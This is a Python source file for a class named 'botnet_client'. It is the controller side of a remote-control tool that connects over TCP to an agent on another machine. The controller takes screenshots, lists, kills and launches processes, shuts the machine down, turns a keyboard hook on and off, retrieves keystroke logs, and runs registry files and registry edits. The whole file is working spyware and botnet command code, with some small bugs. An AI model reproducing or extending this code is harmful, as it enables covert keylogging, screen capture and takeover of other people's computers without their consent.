import socket
import io
import PIL.Image

class botnet_client:
#-------------------PRIVATE AREA-------------------
    HOST = '127.0.0.1'  # The default server's hostname or IP address
    PORT = 26101  # The default port used by the server
    BUF_SIZE = 256
    def __init__(self, host = HOST, port = PORT):
        self.host = host
        self.port = port
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #destructor of object
    def __del__(self):
        if (self.nr != None):
            self.nr.close()
            self.nw.close()
            self.conn.close()
            self.nr = None
            
    def __recv(self):
        size = int(self.nr.readline().strip())
        chunks = []
        while size > 0:
            chunk = self.conn.recv(min(size, BUF_SIZE))
            if chunk == b'':
                raise RuntimeError("socket connection broken")
            chunks.append(chunk)
            size -= len(chunk)
        return b''.join(chunks)
    
    def __send(self, data):
        self.nw.write(str(len(data)) + '\n'); self.nw.flush()
        self.conn.sendall(data)
        
        
#-------------------PUBLIC AREA-------------------
    def set(self, host = HOST, port = PORT):
        self.host = host
        self.port = port
        
    def connect(self):
        try:
            self.conn.connect((self.host, self.port)) # connection socket
            self.nr = self.conn.makefile(mode = 'r', encoding = 'utf-8') # stream reader
            self.nw = self.conn.makefile(mode = 'w', encoding = 'utf-8') # stream writer
            return "Connected successfully!"
        except:
            return "Connected failed"
    
    def close_connect(self):
        if (self.nr != None):
            self.send_message("QUIT")
            self.nr.close()
            self.nw.close()
            self.conn.close()
            self.nr = None
    
    # send request
    def send_message(self, msg):
        self.nw.write(msg + '\n')
        self.nw.flush()
    
    # get screenshot of botnet
    def get_screenshot(self):
        self.send_message("PIC")
        # receive data
        data = self.__recv()
        # write data to image
        image = PIL.Image.open(io.BytesIO(data))
        self.conn.recv(1)
        return image
    
    # get list of running process of botnet
    def get_list_process(self):
        self.send_message("PROC")
        size = int(self.nr.readline().strip())
        procs = []
        for i in range(size):
            proc = []
            proc.append(self.nr.readline().strip()) # process name
            proc.append(self.nr.readline().strip()) # process id
            proc.append(self.nr.readline().strip()) # thread count
            # add proc to list
            procs.append(proc)
        self.conn.recv(1)
        return procs
    
    # kill process of botnet by pid
    # return string (successful/failed)
    def kill_process(self, pid):
        self.send_message("KILLPROC")
        self.nw.write(str(pid) + '\n'); self.nw.flush()
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Killed process at pid {0} successully!".format(pid)
        else:
            return "Killed process at pid {0} failed!".format(pid)
        
    # start process of botnet by name
    def start_process(self, name):
        self.send_message("STARTPROC")
        self.nw.write(str(name) + '\n'); self.nw.flush()
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Start process with name {0} successully!".format(name)
        else:
            return "Start process with name {0} failed!".format(name)
    
    # get list of running process of botnet
    def get_list_app(self):
        self.send_message("APP")
        size = int(self.nr.readline().strip())
        procs = []
        for i in range(size):
            proc = []
            proc.append(self.nr.readline().strip()) # process name
            proc.append(self.nr.readline().strip()) # process id
            proc.append(self.nr.readline().strip()) # thread count
            # add proc to list
            procs.append(proc)
        self.conn.recv(1)
        return procs
    
    # kill process of botnet by pid
    def kill_app(self, pid):
        self.send_message("KILLAPP")
        self.nw.write(str(pid) + '\n'); self.nw.flush()
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Killed app at pid {0} successully!".format(pid)
        else:
            return "Killed app at pid {0} failed!".format(pid)
        
    # start process of botnet by name
    def start_app(self, name):
        self.send_message("STARTAPP")
        self.nw.write(str(name) + '\n'); self.nw.flush()
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Start application with name {0} successully!".format(name)
        else:
            return "Start application with name {0} failed!".format(name)
        
    # shut down server
    def shutdown(self):
        self.send_message("SHUTDOWN")
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Shutdown server successfully!"
        else:
            return "Shutdown server failed!"
    
    # start hook key
    def hook_key(self):
        self.send_message("HOOK")
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Hook key successfully!"
        else:
            return "Hook key failed!"
    
    # end hook key
    def unhook_key(self):
        self.send_message("UNHOOK")
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Unhook key successfully!"
        else:
            return "Unhook key failed!"
    
    # get key log of server
    def get_key_log(self):
        self.send_message("KEYLOG")
        data = self.__recv()
        self.conn.recv(1)
        return data.decode("utf-8")
    
    # send registry file to server
    def send_reg_text(self, reg_txt):
        self.send_message("REGFILE")
        data = str.encode(reg_txt)
        self.conn.recv(1)
        self.__send(data)
        ok = self.conn.recv(1)
        if (ok != b'0'):
            return "Execute registry file successfully!"
        else:
            return "Execute registry file failed!"
    
    # send refistry command to server
    def send_reg_cmd(self, cmd, path, val_name, val, val_type):
        self.send_message("REGCMD")
        self.nw.write(cmd + '\n'); self.nw.flush()
        self.nw.write(path + '\n'); self.nw.flush()
        self.nw.write(val_name + '\n'); self.nw.flush()
        self.nw.write(val + '\n'); self.nw.flush()
        self.nw.write(val_type + '\n'); self.nw.flush()
        
        if (cmd == "GETVAL"):
            val = self.__recv().decode('utf-8')
        
        ok = self.conn.recv(1)
        if (ok != b'0'):
            if (cmd == "GETVAL"):
                return val_name + " = " + val + "\n"
            elif (cmd == "SETVAL"):
                return "Set value successfully!\n"
            elif (cmd == "DELVAL"):
                return "Delete value successfully!\n"
            elif (cmd == "CREKEY"):
                return "Create key successfully!\n"
            elif (cmd == "DELKEY"):
                return "Delete key successfully!\n"
            else:
                return "Wrong registry command!\n"
        else:
            return "Failed to modify registry!\n"

'''cl = botnet_client()
cl.connect()

cl.get_screenshot().save("test.png")
cl.close_connect()'''